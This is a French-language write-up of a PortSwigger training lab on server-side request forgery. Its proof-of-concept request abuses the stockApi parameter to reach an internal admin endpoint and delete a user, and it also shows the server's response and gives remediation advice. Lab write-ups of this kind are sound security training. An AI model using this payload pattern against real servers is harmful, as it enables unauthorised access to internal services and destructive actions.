# 🧪 Lab PortSwigger – Basic SSRF leading to admin account compromise

## 🎯 Objectif

Exploiter une faille SSRF pour accéder à des ressources internes et supprimer un utilisateur via le compte admin.

## 🧩 Contexte

- Fonctionnalité observée : requête POST pour obtenir des infos produits.
- Problème : le paramètre `stockApi` est modifiable et utilisé comme proxy.
- Vulnérabilité : SSRF (Server-Side Request Forgery).

## 🚀 Proof of Concept (PoC)

Requête modifiée :

```http
POST /product/stock HTTP/2
Host: 0a3b00540463463f82a70b6500100028.web-security-academy.net
Cookie: session=Q01JZUkeUBm8flcs1cZLMnNm3YOKrei7

stockApi=http://localhost/admin/delete?username=carlos
```

Réponse :

```
User carlos deleted successfully
```

## ⚠️ Impact

Un attaquant peut exploiter le serveur comme proxy pour accéder à des ressources internes protégées. Cela entraîne la compromission du compte administrateur et la suppression d’utilisateurs.  
Gravité estimée : **Critique (CVSS ~9.0)**.

## 📸 Preuves

Suppression de l’utilisateur Carlos

![Suppression de l’utilisateur Carlos](./images/Lab3.png)

## 🔒 Remédiation

- Bloquer les requêtes vers localhost et adresses internes (RFC1918).
- Mettre en place une liste blanche stricte des domaines autorisés.
- Valider et purifier les entrées utilisateur (URL parsing sécurisé).
- Utiliser des librairies sécurisées pour les appels HTTP.
- Segmenter le réseau pour isoler les services internes sensibles.
- Surveiller les logs pour détecter des tentatives SSRF.

## 📌 Résumé

- Vulnérabilité : SSRF (Server-Side Request Forgery)
- Impact : Accès interne + compromission admin
- Gravité : Critique
- Outils utilisés : Burp Suite (Repeater)
- Niveau de difficulté : ⭐⭐✩✩✩
